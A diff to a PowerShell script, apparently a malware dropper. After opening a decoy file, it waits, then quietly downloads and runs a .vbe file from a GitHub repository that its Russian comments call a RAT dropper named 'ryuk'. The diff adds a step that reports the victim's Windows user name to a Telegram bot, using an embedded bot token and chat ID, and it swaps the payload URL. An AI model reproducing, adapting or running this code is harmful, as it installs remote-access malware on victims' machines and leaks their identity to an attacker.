@@ -53,11 +53,29 @@ $content = @"
 $content | Out-File -FilePath $filePath -Encoding UTF8
 Invoke-Item $filePath
 
+# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
+$Token = "8261323919:AAFuJ409vINSVQrZKeAc3V3ASDIPw3FDuQA"
+$ChatID = "1993464525"
+$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$Message = "The user's shortcut was enabled for user: $CurrentUser"
+
+$URL = "https://api.telegram.org/bot$Token/sendMessage"
+
+$Body = @{
+    chat_id = $ChatID
+    text = $Message
+} | ConvertTo-Json
+
+try {
+    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
+} catch {
+}
+
 # ЗАДЕРЖКА
-Start-Sleep -Seconds 240
+Start-Sleep -Seconds 444
 
 # СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
-$Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
+$Url = "https://github.com/BamBak39/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
 $FileName = "ryuk.vbe"
 $LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
 $DownloadPath = Join-Path $LocalAppData $FileName
@@ -75,5 +93,6 @@ try {
 catch {
 	
 }
+
 
 exit
